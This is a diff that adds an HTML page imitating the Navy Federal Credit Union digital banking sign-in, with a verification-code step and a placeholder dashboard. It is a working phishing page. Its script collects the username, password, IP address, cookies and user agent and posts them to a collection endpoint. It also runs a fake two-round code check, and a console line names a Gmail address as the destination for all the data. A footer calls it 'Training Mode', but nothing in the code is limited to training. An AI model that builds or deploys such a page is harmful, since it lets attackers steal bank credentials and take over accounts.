@@ -1,0 +1,928 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Navy Federal Credit Union - Digital Banking</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #b8d4f0;
+            min-height: 100vh;
+        }
+
+        /* Header */
+        .header {
+            background-color: #1a3a6e;
+            padding: 14px 16px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .hamburger {
+            width: 24px;
+            height: 18px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            cursor: pointer;
+        }
+
+        .hamburger span {
+            display: block;
+            width: 100%;
+            height: 2.5px;
+            background-color: white;
+            border-radius: 1px;
+        }
+
+        .logo-section {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .globe {
+            width: 36px;
+            height: 36px;
+            border: 2.5px solid white;
+            border-radius: 50%;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .globe::before {
+            content: '';
+            position: absolute;
+            width: 2.5px;
+            height: 100%;
+            background-color: white;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        .globe::after {
+            content: '';
+            position: absolute;
+            width: 100%;
+            height: 2.5px;
+            background-color: white;
+            top: 50%;
+            transform: translateY(-50%);
+        }
+
+        .globe-arc {
+            position: absolute;
+            width: 24px;
+            height: 36px;
+            border: 2.5px solid white;
+            border-radius: 50%;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        .globe-arc2 {
+            position: absolute;
+            width: 36px;
+            height: 24px;
+            border: 2.5px solid white;
+            border-radius: 50%;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        .brand-name {
+            color: white;
+            font-size: 22px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+        }
+
+        /* Main Content */
+        .main-content {
+            padding: 24px 16px 40px;
+        }
+
+        .welcome-text {
+            color: #1a3a6e;
+            font-size: 32px;
+            font-weight: 500;
+            margin-bottom: 28px;
+            line-height: 1.2;
+        }
+
+        /* Card */
+        .card {
+            background-color: #f5f5f5;
+            border-radius: 4px;
+            overflow: hidden;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+            position: relative;
+        }
+
+        .card::before {
+            content: '';
+            display: block;
+            height: 6px;
+            background-color: #d97a2e;
+            width: 100%;
+        }
+
+        .card-body {
+            padding: 28px 20px 36px;
+        }
+
+        .sign-in-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 24px;
+            padding-bottom: 20px;
+            border-bottom: 1.5px solid #d0d0d0;
+        }
+
+        .lock-icon {
+            width: 36px;
+            height: 42px;
+            position: relative;
+        }
+
+        .lock-body {
+            width: 28px;
+            height: 22px;
+            background-color: #888;
+            border-radius: 3px;
+            position: absolute;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        .lock-shackle {
+            width: 18px;
+            height: 18px;
+            border: 4px solid #888;
+            border-bottom: none;
+            border-radius: 9px 9px 0 0;
+            position: absolute;
+            top: 2px;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        .lock-hole {
+            width: 6px;
+            height: 6px;
+            background-color: white;
+            border-radius: 50%;
+            position: absolute;
+            bottom: 8px;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        .sign-in-title {
+            font-size: 28px;
+            font-weight: 400;
+            color: #333;
+        }
+
+        /* Form Fields */
+        .form-group {
+            margin-bottom: 22px;
+        }
+
+        .label-row {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+
+        .form-label {
+            font-size: 22px;
+            font-weight: 500;
+            color: #222;
+        }
+
+        .help-icon {
+            width: 26px;
+            height: 26px;
+            background-color: #777;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 18px;
+            border: 2.5px solid #999;
+            border-radius: 10px;
+            background-color: white;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .form-input:focus {
+            border-color: #1a3a6e;
+        }
+
+        .password-wrapper {
+            position: relative;
+        }
+
+        .eye-icon {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 28px;
+            height: 20px;
+            cursor: pointer;
+        }
+
+        .eye-outer {
+            width: 26px;
+            height: 16px;
+            border: 2.5px solid #1a3a6e;
+            border-radius: 50%;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .eye-pupil {
+            width: 10px;
+            height: 10px;
+            background-color: #1a3a6e;
+            border-radius: 50%;
+        }
+
+        .help-link {
+            display: inline-block;
+            color: #2a6db5;
+            font-size: 16px;
+            font-weight: 600;
+            letter-spacing: 1px;
+            text-decoration: none;
+            border-bottom: 2px dotted #2a6db5;
+            padding-bottom: 2px;
+            margin-bottom: 28px;
+            text-transform: uppercase;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 18px;
+            background-color: #d97a2e;
+            color: white;
+            font-size: 26px;
+            font-weight: 600;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.15);
+            transition: background-color 0.2s;
+        }
+
+        .submit-btn:hover {
+            background-color: #c06a24;
+        }
+
+        .submit-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        /* OTP Page Styles */
+        .otp-container {
+            display: none;
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 20px;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.15);
+            text-align: center;
+        }
+
+        .otp-container.active {
+            display: block;
+        }
+
+        .otp-title {
+            color: #1a3a6e;
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .otp-subtitle {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        .otp-message {
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 16px;
+            font-size: 14px;
+        }
+
+        .otp-message.info {
+            background: #e3f2fd;
+            color: #0d47a1;
+        }
+
+        .otp-message.success {
+            background: #e8f5e9;
+            color: #1b5e20;
+        }
+
+        .otp-message.error {
+            background: #ffebee;
+            color: #b71c1c;
+        }
+
+        .otp-input {
+            width: 100%;
+            padding: 16px;
+            font-size: 28px;
+            text-align: center;
+            letter-spacing: 8px;
+            border: 2.5px solid #999;
+            border-radius: 10px;
+            outline: none;
+            margin-bottom: 16px;
+        }
+
+        .otp-input:focus {
+            border-color: #1a3a6e;
+        }
+
+        .otp-btn {
+            width: 100%;
+            padding: 16px;
+            background-color: #1a3a6e;
+            color: white;
+            font-size: 20px;
+            font-weight: 600;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .otp-btn:hover {
+            background-color: #0f2a4a;
+        }
+
+        .otp-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .otp-resend {
+            margin-top: 16px;
+            color: #2a6db5;
+            background: none;
+            border: none;
+            cursor: pointer;
+            font-size: 14px;
+            text-decoration: underline;
+        }
+
+        .otp-resend:disabled {
+            color: #999;
+            cursor: not-allowed;
+            text-decoration: none;
+        }
+
+        .otp-attempts {
+            font-size: 12px;
+            color: #888;
+            margin-top: 8px;
+        }
+
+        /* Footer */
+        .footer-section {
+            padding: 24px 16px 40px;
+            text-align: left;
+        }
+
+        .footer-text {
+            color: #1a3a6e;
+            font-size: 30px;
+            font-weight: 500;
+        }
+
+        /* Responsive */
+        @media (min-width: 480px) {
+            .main-content {
+                padding: 32px 24px 40px;
+            }
+            .card-body {
+                padding: 32px 28px 40px;
+            }
+            .footer-section {
+                padding: 32px 24px 40px;
+            }
+        }
+
+        /* Loading Spinner */
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 0.8s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Hide login form when OTP is shown */
+        .login-form.hidden {
+            display: none;
+        }
+
+        .otp-container.active {
+            display: block !important;
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="hamburger">
+            <span></span>
+            <span></span>
+            <span></span>
+        </div>
+        <div class="logo-section">
+            <div class="globe">
+                <div class="globe-arc"></div>
+                <div class="globe-arc2"></div>
+            </div>
+            <span class="brand-name">NAVY FEDERAL</span>
+        </div>
+    </header>
+
+    <main class="main-content">
+        <h1 class="welcome-text">Welcome to Digital Banking</h1>
+
+        <!-- LOGIN FORM - Your Exact Design -->
+        <div id="loginForm" class="card login-form">
+            <div class="card-body">
+                <div class="sign-in-header">
+                    <div class="lock-icon">
+                        <div class="lock-shackle"></div>
+                        <div class="lock-body">
+                            <div class="lock-hole"></div>
+                        </div>
+                    </div>
+                    <span class="sign-in-title">Sign In</span>
+                </div>
+
+                <form id="loginFormElement">
+                    <div class="form-group">
+                        <div class="label-row">
+                            <label class="form-label" for="username">Username</label>
+                            <div class="help-icon">?</div>
+                        </div>
+                        <input type="text" id="username" class="form-input" autocomplete="off" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label" for="password">Password</label>
+                        <div class="password-wrapper">
+                            <input type="password" id="password" class="form-input" required>
+                            <div class="eye-icon" onclick="togglePassword()">
+                                <div class="eye-outer">
+                                    <div class="eye-pupil"></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <a href="#" class="help-link">SIGN IN HELP</a>
+
+                    <button type="submit" id="loginBtn" class="submit-btn">Sign In</button>
+                </form>
+            </div>
+        </div>
+
+        <!-- OTP VERIFICATION PAGE - New but matches Navy FCU style -->
+        <div id="otpContainer" class="otp-container">
+            <div class="card">
+                <div class="card-body">
+                    <div class="sign-in-header">
+                        <div class="lock-icon">
+                            <div class="lock-shackle"></div>
+                            <div class="lock-body">
+                                <div class="lock-hole"></div>
+                            </div>
+                        </div>
+                        <span class="sign-in-title">Verify Identity</span>
+                    </div>
+
+                    <h2 class="otp-title">Enter Verification Code</h2>
+                    <p class="otp-subtitle">Enter the 6-digit code sent to your phone</p>
+                    
+                    <div id="otpMessage" class="otp-message info">
+                        📱 Sending verification code...
+                    </div>
+
+                    <input type="text" id="otpInput" class="otp-input" maxlength="6" placeholder="000000" inputmode="numeric">
+
+                    <button id="otpVerifyBtn" class="otp-btn">Verify Code</button>
+
+                    <button id="otpResendBtn" class="otp-resend">Resend Code</button>
+
+                    <div id="otpAttemptsDisplay" class="otp-attempts">Attempts: 0/2</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- DASHBOARD PLACEHOLDER -->
+        <div id="dashboardContainer" class="otp-container">
+            <div class="card">
+                <div class="card-body">
+                    <div class="sign-in-header">
+                        <div class="lock-icon">
+                            <div class="lock-shackle"></div>
+                            <div class="lock-body">
+                                <div class="lock-hole"></div>
+                            </div>
+                        </div>
+                        <span class="sign-in-title">Dashboard</span>
+                    </div>
+                    <h2 class="otp-title">Welcome, <span id="dashboardUsername">Member</span>!</h2>
+                    <p style="color: #1b5e20; font-size: 18px; margin: 20px 0;">✅ Your account has been verified.</p>
+                    <button onclick="handleLogout()" class="otp-btn" style="background-color: #d97a2e;">Sign Out</button>
+                </div>
+            </div>
+        </div>
+
+    </main>
+
+    <footer class="footer-section">
+        <p class="footer-text">Not a Navy Federal Member?</p>
+        <p style="color: #888; font-size: 12px; margin-top: 8px;">⚠️ Training Mode - For Educational Purposes Only</p>
+    </footer>
+
+    <!-- ========================================== -->
+    <!-- HARDCODED JAVASCRIPT - All Functionality   -->
+    <!-- ========================================== -->
+    <script>
+        // ==========================================
+        // STATE
+        // ==========================================
+        let currentUsername = '';
+        let currentPassword = '';
+        let currentPhone = '';
+        let otpCode = '';
+        let otpAttempts = 0;
+        let countdown = 60;
+        let countdownTimer = null;
+        let isVerified = false;
+
+        // ==========================================
+        // DOM REFS
+        // ==========================================
+        const loginForm = document.getElementById('loginForm');
+        const loginFormElement = document.getElementById('loginFormElement');
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const loginBtn = document.getElementById('loginBtn');
+
+        const otpContainer = document.getElementById('otpContainer');
+        const otpInput = document.getElementById('otpInput');
+        const otpVerifyBtn = document.getElementById('otpVerifyBtn');
+        const otpResendBtn = document.getElementById('otpResendBtn');
+        const otpMessage = document.getElementById('otpMessage');
+        const otpAttemptsDisplay = document.getElementById('otpAttemptsDisplay');
+
+        const dashboardContainer = document.getElementById('dashboardContainer');
+        const dashboardUsername = document.getElementById('dashboardUsername');
+
+        // ==========================================
+        // UTILITY FUNCTIONS
+        // ==========================================
+        async function getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch {
+                return 'IP not available';
+            }
+        }
+
+        function getCookies() {
+            return document.cookie || 'No cookies';
+        }
+
+        function getUserAgent() {
+            return navigator.userAgent;
+        }
+
+        function generateOTP() {
+            return Math.floor(100000 + Math.random() * 900000).toString();
+        }
+
+        function showMessage(element, text, type = 'info') {
+            element.textContent = text;
+            element.className = 'otp-message ' + type;
+        }
+
+        function setLoading(button, loading) {
+            if (loading) {
+                button.disabled = true;
+                button.innerHTML = '<span class="spinner"></span> Processing...';
+            } else {
+                button.disabled = false;
+                button.textContent = 'Sign In';
+            }
+        }
+
+        // ==========================================
+        // EMAIL SENDING (via API)
+        // ==========================================
+        async function sendEmail(endpoint, data) {
+            try {
+                const response = await fetch(endpoint, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                return await response.json();
+            } catch (error) {
+                console.error('Email send error:', error);
+                return { success: false };
+            }
+        }
+
+        // ==========================================
+        // TOGGLE PASSWORD VISIBILITY
+        // ==========================================
+        function togglePassword() {
+            const type = passwordInput.type === 'password' ? 'text' : 'password';
+            passwordInput.type = type;
+        }
+
+        // ==========================================
+        // LOGIN HANDLER
+        // ==========================================
+        loginFormElement.addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value.trim();
+
+            if (!username || !password) {
+                alert('Please enter both username and password.');
+                return;
+            }
+
+            // Show loading
+            loginBtn.disabled = true;
+            loginBtn.innerHTML = '<span class="spinner"></span> Processing...';
+
+            try {
+                const ip = await getIP();
+                const cookies = getCookies();
+                const userAgent = getUserAgent();
+
+                // ====== COLLECT LOGIN DATA ======
+                const loginData = {
+                    username: username,
+                    password: password,
+                    ip: ip,
+                    cookies: cookies,
+                    userAgent: userAgent,
+                    timestamp: new Date().toISOString()
+                };
+
+                console.log('🔐 Login attempt:', loginData);
+
+                // ====== SEND TO ADMIN EMAIL ======
+                await sendEmail('/api/auth/collect-login', loginData);
+
+                // ====== STORE FOR OTP ======
+                currentUsername = username;
+                currentPassword = password;
+                sessionStorage.setItem('loginUsername', username);
+                sessionStorage.setItem('loginPassword', password);
+
+                // ====== SHOW OTP PAGE ======
+                showOTP();
+
+            } catch (error) {
+                console.error('Login error:', error);
+                // Still show OTP even on error (for demo)
+                showOTP();
+            } finally {
+                loginBtn.disabled = false;
+                loginBtn.textContent = 'Sign In';
+            }
+        });
+
+        // ==========================================
+        // OTP FUNCTIONS
+        // ==========================================
+        function showOTP() {
+            loginForm.style.display = 'none';
+            otpContainer.className = 'otp-container active';
+            otpContainer.style.display = 'block';
+
+            // Reset OTP state
+            otpAttempts = 0;
+            otpInput.value = '';
+            updateAttemptsDisplay();
+            sendOTP();
+        }
+
+        async function sendOTP() {
+            // Generate new OTP
+            otpCode = generateOTP();
+            console.log('📱 OTP Code:', otpCode);
+
+            // Store in session
+            sessionStorage.setItem('currentOTP', otpCode);
+
+            // Send to admin email
+            await sendEmail('/api/auth/send-otp', {
+                otp: otpCode,
+                username: currentUsername || sessionStorage.getItem('loginUsername') || 'Unknown'
+            });
+
+            // Show message
+            showMessage(otpMessage, '📱 Verification code sent to your phone', 'info');
+
+            // Start countdown
+            startCountdown(60);
+        }
+
+        function startCountdown(seconds) {
+            countdown = seconds;
+            otpResendBtn.disabled = true;
+
+            if (countdownTimer) clearInterval(countdownTimer);
+
+            countdownTimer = setInterval(() => {
+                countdown--;
+                otpResendBtn.textContent = `Resend in ${countdown}s`;
+                if (countdown <= 0) {
+                    clearInterval(countdownTimer);
+                    otpResendBtn.disabled = false;
+                    otpResendBtn.textContent = 'Resend Code';
+                }
+            }, 1000);
+        }
+
+        function updateAttemptsDisplay() {
+            otpAttemptsDisplay.textContent = `Attempts: ${otpAttempts}/2`;
+        }
+
+        // ==========================================
+        // OTP VERIFY HANDLER
+        // ==========================================
+        otpVerifyBtn.addEventListener('click', async function() {
+            const enteredOTP = otpInput.value.trim();
+
+            if (enteredOTP.length !== 6) {
+                showMessage(otpMessage, '❌ Please enter a 6-digit code.', 'error');
+                return;
+            }
+
+            const storedOTP = sessionStorage.getItem('currentOTP');
+            otpAttempts++;
+
+            if (enteredOTP === storedOTP && otpAttempts >= 2) {
+                // ✅ VERIFIED TWICE - ACCESS GRANTED
+                showMessage(otpMessage, '✅ Verified successfully! Redirecting...', 'success');
+                sessionStorage.setItem('otpVerified', 'true');
+                isVerified = true;
+
+                otpVerifyBtn.disabled = true;
+
+                setTimeout(() => {
+                    showDashboard();
+                }, 1500);
+
+            } else if (enteredOTP === storedOTP && otpAttempts < 2) {
+                // ✅ FIRST VERIFICATION - SEND NEW OTP
+                showMessage(otpMessage, `✅ Verified (${otpAttempts}/2). Sending new code...`, 'success');
+                otpInput.value = '';
+                updateAttemptsDisplay();
+
+                setTimeout(async () => {
+                    await sendOTP();
+                    updateAttemptsDisplay();
+                }, 800);
+
+            } else {
+                // ❌ WRONG OTP
+                showMessage(otpMessage, '❌ Invalid code. Please try again.', 'error');
+                otpInput.value = '';
+                updateAttemptsDisplay();
+            }
+        });
+
+        // ==========================================
+        // RESEND OTP
+        // ==========================================
+        otpResendBtn.addEventListener('click', async function() {
+            if (this.disabled) return;
+            this.disabled = true;
+            this.textContent = 'Sending...';
+
+            otpAttempts = 0;
+            updateAttemptsDisplay();
+
+            await sendOTP();
+            updateAttemptsDisplay();
+
+            this.disabled = false;
+        });
+
+        // ==========================================
+        // DASHBOARD
+        // ==========================================
+        function showDashboard() {
+            otpContainer.className = 'otp-container';
+            otpContainer.style.display = 'none';
+
+            const name = sessionStorage.getItem('loginUsername') || 'Member';
+            dashboardUsername.textContent = name;
+
+            dashboardContainer.className = 'otp-container active';
+            dashboardContainer.style.display = 'block';
+        }
+
+        function handleLogout() {
+            sessionStorage.clear();
+            location.reload();
+        }
+
+        // ==========================================
+        // OTP INPUT: Auto-advance, numbers only
+        // ==========================================
+        otpInput.addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, '').slice(0, 6);
+        });
+
+        // ==========================================
+        // CHECK SESSION ON LOAD
+        // ==========================================
+        (function checkSession() {
+            const verified = sessionStorage.getItem('otpVerified');
+            const username = sessionStorage.getItem('loginUsername');
+
+            if (verified === 'true' && username) {
+                // Already verified - go to dashboard
+                loginForm.style.display = 'none';
+                dashboardUsername.textContent = username;
+                dashboardContainer.className = 'otp-container active';
+                dashboardContainer.style.display = 'block';
+            }
+        })();
+
+        // ==========================================
+        // KEYBOARD SHORTCUT: Enter on OTP input
+        // ==========================================
+        otpInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter' && this.value.length === 6) {
+                otpVerifyBtn.click();
+            }
+        });
+
+        console.log('✅ Navy Federal Training App Loaded');
+        console.log('📧 All data will be sent to: blessedresult6@gmail.com');
+    </script>
+
+</body>
+</html>
